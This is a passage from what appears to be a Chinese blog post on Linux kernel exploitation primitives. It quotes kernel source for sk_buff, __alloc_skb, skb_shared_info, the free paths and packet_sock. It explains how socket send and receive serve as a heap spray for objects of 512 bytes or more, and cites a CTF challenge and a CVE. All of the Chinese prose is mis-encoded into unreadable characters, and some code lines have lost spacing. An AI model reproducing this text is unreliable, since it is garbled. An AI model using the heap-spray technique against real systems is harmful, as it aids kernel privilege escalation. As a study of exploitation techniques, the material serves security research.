<code>sk_buff</code> è¿™ä¸€åŸºç¡€ç»“æ„ä½“ï¼Œä½†ç›¸æ¯”äºä»–çš„å¸¸è§„åŠŸèƒ½ï¼Œæˆ‘ä»¬æ›´åŠ å…³æ³¨å…¶åœ¨æ¼æ´åˆ©ç”¨ä¸­ç»™æˆ‘ä»¬å¸¦æ¥çš„ä¾¿åˆ©</p><h2 id="sk-buffï¼šsize-gt-x3D-512-çš„å¯¹è±¡åˆ†é…"><a href="#sk-buffï¼šsize-gt-x3D-512-çš„å¯¹è±¡åˆ†é…" class="headerlink" title="sk_buffï¼šsize &gt;&#x3D; 512 çš„å¯¹è±¡åˆ†é…"></a>sk_buffï¼šsize &gt;&#x3D; 512 çš„å¯¹è±¡åˆ†é…</h2><p><code>sk_buff</code> æ˜¯ Linux kernel ç½‘ç»œåè®®æ ˆä¸­ä¸€ä¸ª<strong>é‡è¦çš„åŸºç¡€ç»“æ„ä½“</strong>ï¼Œå…¶ç”¨ä»¥è¡¨ç¤ºåœ¨ç½‘ç»œåè®®æ ˆä¸­ä¼ è¾“çš„ä¸€ä¸ªã€ŒåŒ…ã€ï¼Œä½†å…¶ç»“æ„ä½“æœ¬èº«ä¸åŒ…å«ä¸€ä¸ªåŒ…çš„æ•°æ®éƒ¨åˆ†ï¼Œè€Œæ˜¯åŒ…å«è¯¥åŒ…çš„å„ç§å±æ€§ï¼Œ<strong>æ•°æ®åŒ…çš„æœ¬ä½“æ•°æ®åˆ™ä½¿ç”¨ä¸€ä¸ªå•ç‹¬çš„ object å‚¨å­˜</strong></p><p>è¿™ä¸ªç»“æ„ä½“æˆå‘˜æ¯”è¾ƒå¤šï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨æ ¸å¿ƒéƒ¨åˆ†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="comment">/* These two members must be first. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>*<span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>*<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* These elements must be at the end, see alloc_skb() for details.  */</span></span><br><span class="line"><span class="type">sk_buff_data_t</span>tail;</span><br><span class="line"><span class="type">sk_buff_data_t</span>end;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>*head,</span><br><span class="line">*data;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>truesize;</span><br><span class="line"><span class="type">refcount_t</span>users;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SKB_EXTENSIONS</span></span><br><span class="line"><span class="comment">/* only useable after checking -&gt;active_extensions != 0 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_ext</span>*<span class="title">extensions</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>sk_buff</code> ç»“æ„ä½“ä¸å…¶æ‰€è¡¨ç¤ºçš„æ•°æ®åŒ…å½¢æˆå¦‚ä¸‹ç»“æ„ï¼Œå…¶ä¸­ï¼š</p><ul><li><code>head</code> ï¼šä¸€ä¸ªæ•°æ®åŒ…<strong>å®é™…çš„èµ·å§‹å¤„</strong>ï¼ˆä¹Ÿå°±æ˜¯ä¸ºè¯¥æ•°æ®åŒ…åˆ†é…çš„ object çš„é¦–åœ°å€ï¼‰</li><li><code>end</code> ï¼šä¸€ä¸ªæ•°æ®åŒ…å®é™…çš„æœ«å°¾ï¼ˆä¸ºè¯¥æ•°æ®åŒ…åˆ†é…çš„ object çš„æœ«å°¾åœ°å€ï¼‰</li><li><code>data</code> ï¼š<strong>å½“å‰æ‰€åœ¨ layer çš„æ•°æ®åŒ…å¯¹åº”çš„èµ·å§‹åœ°å€</strong></li><li><code>tail</code> ï¼š<strong>å½“å‰æ‰€åœ¨ layer çš„æ•°æ®åŒ…å¯¹åº”çš„æœ«å°¾åœ°å€</strong></li></ul><p>data å’Œ tail å¯ä»¥è¿™ä¹ˆç†è§£ï¼šæ•°æ®åŒ…æ¯ç»è¿‡ç½‘ç»œå±‚æ¬¡æ¨¡å‹ä¸­çš„ä¸€å±‚éƒ½ä¼šè¢«æ·»åŠ &#x2F;åˆ é™¤ä¸€ä¸ª header ï¼ˆæœ‰æ—¶è¿˜æœ‰ä¸€ä¸ª tailï¼‰ï¼Œdata ä¸ tail ä¾¿æ˜¯ç”¨ä»¥å¯¹æ­¤è¿›è¡Œæ ‡è¯†çš„</p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>å¤šä¸ª <code>sk_buff</code> ä¹‹é—´å½¢æˆåŒå‘é“¾è¡¨ç»“æ„ï¼Œç±»ä¼¼äº <code>msg_queue</code>ï¼Œè¿™é‡ŒåŒæ ·æœ‰ä¸€ä¸ª <code>sk_buff_head</code> ç»“æ„ä½œä¸ºå“¨å…µèŠ‚ç‚¹</p><p><img src="https://s2.loli.net/2022/04/11/U8CjYMBOcZ74s3W.png" alt="image.png"></p><h3 id="åˆ†é…ï¼ˆæ•°æ®åŒ…ï¼š-GFP-NOMEMALLOC-GFP-NOWARNï¼‰"><a href="#åˆ†é…ï¼ˆæ•°æ®åŒ…ï¼š-GFP-NOMEMALLOC-GFP-NOWARNï¼‰" class="headerlink" title="åˆ†é…ï¼ˆæ•°æ®åŒ…ï¼š__GFP_NOMEMALLOC | __GFP_NOWARNï¼‰"></a>åˆ†é…ï¼ˆæ•°æ®åŒ…ï¼š__GFP_NOMEMALLOC | __GFP_NOWARNï¼‰</h3><p>åœ¨å†…æ ¸ç½‘ç»œåè®®æ ˆä¸­å¾ˆå¤šåœ°æ–¹éƒ½ä¼šç”¨åˆ°è¯¥ç»“æ„ä½“ï¼Œä¾‹å¦‚ sendmsg ç³»ç»Ÿè°ƒç”¨ä¸€ç±»çš„æ“ä½œéƒ½ä¼šé€ æˆåŒ…çš„åˆ›å»ºï¼Œå…¶æœ€ç»ˆéƒ½ä¼šè°ƒç”¨åˆ° <code>alloc_skb()</code> æ¥åˆ†é…è¯¥ç»“æ„ä½“ï¼Œè€Œè¿™ä¸ªå‡½æ•°åˆæ˜¯ <code>__alloc_skb()</code> çš„ wrapperï¼Œä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯å…¶ä¼šä»<strong>ç‹¬ç«‹çš„</strong> <code>skbuff_fclone_cache </code> &#x2F; <code> skbuff_head_cache</code> å– object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *__<span class="title">alloc_skb</span>(<span class="title">unsigned</span> <span class="title">int</span> <span class="title">size</span>, <span class="title">gfp_t</span> <span class="title">gfp_mask</span>,</span></span><br><span class="line"><span class="class">    <span class="title">int</span> <span class="title">flags</span>, <span class="title">int</span> <span class="title">node</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">cache</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">u8 *data;</span><br><span class="line"><span class="type">bool</span> pfmemalloc;</span><br><span class="line"></span><br><span class="line">cache = (flags &amp; SKB_ALLOC_FCLONE)</span><br><span class="line">? skbuff_fclone_cache : skbuff_head_cache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sk_memalloc_socks() &amp;&amp; (flags &amp; SKB_ALLOC_RX))</span><br><span class="line">gfp_mask |= __GFP_MEMALLOC;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get the HEAD */</span></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; (SKB_ALLOC_FCLONE | SKB_ALLOC_NAPI)) == SKB_ALLOC_NAPI &amp;&amp;</span><br><span class="line">    likely(node == NUMA_NO_NODE || node == numa_mem_id()))</span><br><span class="line">skb = napi_skb_cache_get();</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">skb = kmem_cache_alloc_node(cache, gfp_mask &amp; ~GFP_DMA, node);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!skb))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">prefetchw(skb);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We do our best to align skb_shared_info on a separate cache</span></span><br><span class="line"><span class="comment"> * line. It usually works because kmalloc(X &gt; SMP_CACHE_BYTES) gives</span></span><br><span class="line"><span class="comment"> * aligned memory blocks, unless SLUB/SLAB debug is enabled.</span></span><br><span class="line"><span class="comment"> * Both skb-&gt;head and skb_shared_info are cache line aligned.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">size = SKB_DATA_ALIGN(size);</span><br><span class="line">size += SKB_DATA_ALIGN(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> skb_shared_info));</span><br><span class="line">data = kmalloc_reserve(size, gfp_mask, node, &amp;pfmemalloc);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!data))</span><br><span class="line"><span class="keyword">goto</span> nodata;</span><br><span class="line"><span class="comment">/* kmalloc(size) might give us more room than requested.</span></span><br><span class="line"><span class="comment"> * Put skb_shared_info exactly at the end of allocated zone,</span></span><br><span class="line"><span class="comment"> * to allow max possible filling before reallocation.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">size = SKB_WITH_OVERHEAD(ksize(data));</span><br><span class="line">prefetchw(data + size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Only clear those fields we need to clear, not those that we will</span></span><br><span class="line"><span class="comment"> * actually initialise below. Hence, don&#x27;t put any more fields after</span></span><br><span class="line"><span class="comment"> * the tail pointer in struct sk_buff!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">memset</span>(skb, <span class="number">0</span>, offsetof(<span class="keyword">struct</span> sk_buff, tail));</span><br><span class="line">__build_skb_around(skb, data, <span class="number">0</span>);</span><br><span class="line">skb-&gt;pfmemalloc = pfmemalloc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; SKB_ALLOC_FCLONE) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_fclones</span> *<span class="title">fclones</span>;</span></span><br><span class="line"></span><br><span class="line">fclones = container_of(skb, <span class="keyword">struct</span> sk_buff_fclones, skb1);</span><br><span class="line"></span><br><span class="line">skb-&gt;fclone = SKB_FCLONE_ORIG;</span><br><span class="line">refcount_set(&amp;fclones-&gt;fclone_ref, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">fclones-&gt;skb2.fclone = SKB_FCLONE_CLONE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> skb;</span><br><span class="line"></span><br><span class="line">nodata:</span><br><span class="line">kmem_cache_free(cache, skb);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__alloc_skb);</span><br></pre></td></tr></table></figure><p><code>sk_buff</code> è™½ç„¶æ˜¯ä»ç‹¬ç«‹çš„ kmem_cache ä¸­åˆ†é…çš„ï¼Œ<strong>ä½†å…¶å¯¹åº”çš„æ•°æ®åŒ…ä¸æ˜¯</strong>ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œæ³¨æ„åˆ°åˆ†é…æ•°æ®åŒ…æ—¶ä½¿ç”¨çš„æ˜¯ <code>kmalloc_reserve()</code>ï¼Œæœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>__kmalloc_node_track_caller()</code>ï¼Œ<strong>èµ°å¸¸è§„çš„ kmalloc åˆ†é…è·¯å¾„</strong>ï¼Œå› æ­¤æˆ‘ä»¬ä»ç„¶å¯ä»¥å®ç°è¿‘ä¹ä»»æ„å¤§å° object çš„åˆ†é…ä¸é‡Šæ”¾</p><p>å› æ­¤ <code>sk_buff</code> ä¸ <code>msg_msg</code> ä¸€æ ·å¸¸è¢«ç”¨æ¥å®Œæˆå †å–·çš„å·¥ä½œï¼Œä¸åŒçš„æ˜¯ <code>msg_msg</code> å¸¦äº†ä¸€ä¸ª headerï¼Œè€Œ <code>sk_buff</code> çš„æ•°æ®åŒ…åˆ™å¸¦ä¸€ä¸ª tailâ€”â€”<code>skb_shared_info</code> ç»“æ„ä½“</p><p><img src="https://s2.loli.net/2022/04/11/YQJMeIwR8P9hC1t.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> &#123;</span></span><br><span class="line">__u8flags;</span><br><span class="line">__u8meta_len;</span><br><span class="line">__u8nr_frags;</span><br><span class="line">__u8tx_flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>gso_size;</span><br><span class="line"><span class="comment">/* Warning: this field is not always filled in (UFO)! */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>gso_segs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>*<span class="title">frag_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_hwtstamps</span> <span class="title">hwtstamps</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>gso_type;</span><br><span class="line">u32tskey;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Warning : all fields before dataref are cleared in __alloc_skb()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">atomic_t</span>dataref;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Intermediate layers must ensure that destructor_arg</span></span><br><span class="line"><span class="comment"> * remains valid until skb destructor */</span></span><br><span class="line"><span class="type">void</span> *destructor_arg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* must be last field, see pskb_expand_head() */</span></span><br><span class="line"><span class="type">skb_frag_t</span>frags[MAX_SKB_FRAGS];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>skb_shared_info</code> ç»“æ„ä½“çš„<strong>å¤§å°ä¸º 320 å­—èŠ‚ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬èƒ½å¤Ÿåˆ©ç”¨åˆ†é…çš„ object æœ€å°çš„å¤§å°ä¹Ÿå¾—æ˜¯ 512 å­—èŠ‚ï¼Œè¿™æ— ç–‘ä¸ºæˆ‘ä»¬çš„åˆ©ç”¨å¢æ·»äº†å‡ åˆ†éš¾åº¦</strong>ï¼Œä½†ä¸å¯å¦è®¤çš„æ˜¯ <code>sk_buff</code> ä»ä¸ºæˆ‘ä»¬æä¾›äº†è¾ƒå¤§å¯¹è±¡çš„ä»»æ„åˆ†é…å†™å…¥ä¸é‡Šæ”¾</p><h3 id="é‡Šæ”¾"><a href="#é‡Šæ”¾" class="headerlink" title="é‡Šæ”¾"></a>é‡Šæ”¾</h3><p>æ­£æ‰€è°“æœ‰å‘å¿…æœ‰æ”¶ï¼Œæˆ‘ä»¬åªéœ€è¦æ²¿ç€å‘é€çš„è·¯å¾„æ¥æ”¶è¯¥åŒ…å°±èƒ½å°†å…¶é‡Šæ”¾æ‰ï¼Œä¾‹å¦‚è‹¥æ˜¯æˆ‘ä»¬é€šè¿‡å‘å¥—æ¥å­—ä¸­å†™å…¥æ•°æ®åˆ›å»ºäº†ä¸€ä¸ªåŒ…ï¼Œåˆ™ä»å¥—æ¥å­—ä¸­è¯»å‡ºè¯¥åŒ…ä¾¿èƒ½å°†å…¶é‡Šæ”¾</p><p>åœ¨å†…æ ¸ä¸­è°ƒç”¨çš„æ˜¯ <code>kfree_skb()</code> å‡½æ•°è¿›è¡Œé‡Šæ”¾ï¼Œå¯¹äºæ•°æ®ï¼Œå…¶æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>skb_release_data()</code> ï¼Œåœ¨è¿™å…¶ä¸­è°ƒç”¨åˆ° <code>skb_free_head()</code> è¿›è¡Œé‡Šæ”¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">skb_free_head</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *head = skb-&gt;head;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (skb-&gt;head_frag) &#123;</span><br><span class="line"><span class="keyword">if</span> (skb_pp_recycle(skb, head))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">skb_free_frag(head);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">kfree(head);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œ <code>sk_buff</code> æœ¬èº«åˆ™é€šè¿‡ <code>kfree_skbmem()</code> è¿›è¡Œé‡Šæ”¾ï¼Œä¸»è¦å°±æ˜¯ç›´æ¥æ”¾å…¥å¯¹åº”çš„ kmem_cache ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *Free an skbuff by memory without cleaning the state.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">kfree_skbmem</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_fclones</span> *<span class="title">fclones</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (skb-&gt;fclone) &#123;</span><br><span class="line"><span class="keyword">case</span> SKB_FCLONE_UNAVAILABLE:</span><br><span class="line">kmem_cache_free(skbuff_head_cache, skb);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> SKB_FCLONE_ORIG:</span><br><span class="line">fclones = container_of(skb, <span class="keyword">struct</span> sk_buff_fclones, skb1);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We usually free the clone (TX completion) before original skb</span></span><br><span class="line"><span class="comment"> * This test would have no chance to be true for the clone,</span></span><br><span class="line"><span class="comment"> * while here, branch prediction will be good.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (refcount_read(&amp;fclones-&gt;fclone_ref) == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">goto</span> fastpath;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>: <span class="comment">/* SKB_FCLONE_CLONE */</span></span><br><span class="line">fclones = container_of(skb, <span class="keyword">struct</span> sk_buff_fclones, skb2);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!refcount_dec_and_test(&amp;fclones-&gt;fclone_ref))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">fastpath:</span><br><span class="line">kmem_cache_free(skbuff_fclone_cache, fclones);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»è¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡º <code>sk_buff</code> ç»“æ„ä½“ä¹Ÿä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªç®€é™‹çš„â€œèœå•å †â€åŠŸèƒ½ï¼Œæ¯”è¾ƒæœ´ç´ çš„åˆ©ç”¨æ–¹å¼å°±æ˜¯åˆ©ç”¨ <code>socketpair</code> ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€å¯¹å¥—æ¥å­—ï¼Œå¾€å…¶ä¸­ä¸€ç«¯å†™å…¥ä»¥å®Œæˆå‘åŒ…ï¼Œä»å¦ä¸€ç«¯è¯»å‡ºä»¥å®Œæˆæ”¶åŒ…</p><blockquote><p>ä¾‹é¢˜ï¼šD^3CTF2022 - d3kheap</p><p>åˆ©ç”¨å‚è€ƒï¼šCVE-2021-22255</p></blockquote><h1 id="0x0A-packet-sock-ä¸å¥—æ¥å­—ç›¸å…³ï¼ˆTBDï¼‰"><a href="#0x0A-packet-sock-ä¸å¥—æ¥å­—ç›¸å…³ï¼ˆTBDï¼‰" class="headerlink" title="0x0A.packet_sock ä¸å¥—æ¥å­—ç›¸å…³ï¼ˆTBDï¼‰"></a>0x0A.packet_sock ä¸å¥—æ¥å­—ç›¸å…³ï¼ˆTBDï¼‰</h1><p><code>sock</code> ç»“æ„ä½“æ˜¯å†…æ ¸ç½‘ç»œåè®®æ ˆä¸­çš„ä¸€ä¸ªéå¸¸é‡è¦çš„åŸºç¡€ç»“æ„ä½“ï¼Œ<strong>ç”¨ä»¥åœ¨ <em>ç½‘ç»œå±‚</em> è¡¨ç¤ºä¸€ä¸ª socket</strong>ï¼Œå†…æ ¸ä»¥è¿™ä¸ªç»“æ„ä½“ä¸ºæ ¸å¿ƒå»ºç«‹æ›´é«˜å±‚é¢çš„æŠ½è±¡ socketï¼Œä¾‹å¦‚è¡¨ç¤º BSD socket çš„ <code>socket</code> ç»“æ„ä½“æˆ–æ˜¯ <code>inet_socket</code> ç­‰ç»“æ„ä½“éƒ½æœ‰ä¸€ä¸ª <code>sock</code> ç»“æ„ä½“æˆå‘˜ï¼Œæœ¬èŠ‚æˆ‘ä»¬ä»‹ç» <code>AF_PACKET</code> æ—æ‰€ç”¨åˆ°çš„å¥—æ¥å­—ç»“æ„ä½“ <code>packet_sock</code>â€”â€”å…¶é€šè¿‡å¸¸è§„çš„ kmalloc è·¯å¾„è¿›è¡Œåˆ†é…</p><h2 id="packet-sockï¼ˆkmalloc-2048-GFP-KERNELï¼‰"><a href="#packet-sockï¼ˆkmalloc-2048-GFP-KERNELï¼‰" class="headerlink" title="packet_sockï¼ˆkmalloc-2048 | GFP_KERNELï¼‰"></a>packet_sockï¼ˆkmalloc-2048 | GFP_KERNELï¼‰</h2><p>packet socket ç”¨ä»¥åœ¨ <em>è®¾å¤‡é©±åŠ¨çº§</em> ï¼ˆOSI Layer 2ï¼Œæ•°æ®é“¾è·¯å±‚ï¼‰æ”¶å‘ raw packetsï¼Œè¿™å…è®¸ç”¨æˆ·åœ¨ç‰©ç†å±‚ä¹‹ä¸Šåº”ç”¨ç”¨æˆ·ç©ºé—´ä¸­çš„åè®®æ¨¡å—</p><p>å½“æˆ‘ä»¬é€šè¿‡ socket ç³»ç»Ÿè°ƒç”¨åˆ›å»º <code>AF_PACKET</code> æ—çš„å¥—æ¥å­—æ—¶ï¼Œåœ¨å†…æ ¸ç©ºé—´ä¸­ä¼šåˆ›å»ºä¸€ä¸ª <code>packet_sock</code> ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> &#123;</span></span><br><span class="line"><span class="comment">/* struct sock has to be the first member of packet_sock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span><span class="title">sk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_fanout</span>*<span class="title">fanout</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span>  <span class="title">tpacket_stats_u</span><span class="title">stats</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_ring_buffer</span><span class="title">rx_ring</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_ring_buffer</span><span class="title">tx_ring</span>;</span></span><br><span class="line"><span class="type">int</span>copy_thresh;</span><br><span class="line"><span class="type">spinlock_t</span>bind_lock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span><span class="title">pg_vec_lock</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>running;<span class="comment">/* bind_lock must be held */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>auxdata:<span class="number">1</span>,<span class="comment">/* writer must hold sock lock */</span></span><br><span class="line">origdev:<span class="number">1</span>,</span><br><span class="line">has_vnet_hdr:<span class="number">1</span>,</span><br><span class="line">tp_loss:<span class="number">1</span>,</span><br><span class="line">tp_tx_has_off:<span class="number">1</span>;</span><br><span class="line"><span class="type">int</span>pressure;</span><br><span class="line"><span class="type">int</span>ifindex;<span class="comment">/* bound device*/</span></span><br><span class="line">__be16num;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_rollover</span>*<span class="title">rollover</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_mclist</span>*<span class="title">mclist</span>;</span></span><br><span class="line"><span class="type">atomic_t</span>mapped;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> 